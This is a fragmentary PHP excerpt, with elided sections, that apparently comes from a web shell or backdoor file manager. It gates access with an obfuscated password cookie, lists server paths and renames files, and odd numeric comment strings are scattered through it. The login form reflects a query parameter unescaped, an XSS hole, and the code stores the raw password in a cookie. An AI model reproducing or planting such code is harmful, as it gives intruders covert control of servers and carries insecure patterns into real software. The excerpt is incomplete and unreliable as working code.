...
$pass = false;
if (isset($_COOKIE['pw_name_93594'])) {
    if(($_COOKIE['pw_name_93594']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_93594'])) {
        if(($_POST['pw_name_93594']) == $auth_key) {
            setcookie("pw_name_93594", $_POST['pw_name_93594']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_93594' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774466556 1724682774821195 1724682774132051 1724682774332551
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
            $name = PATH . "/" . $_GET['r'];
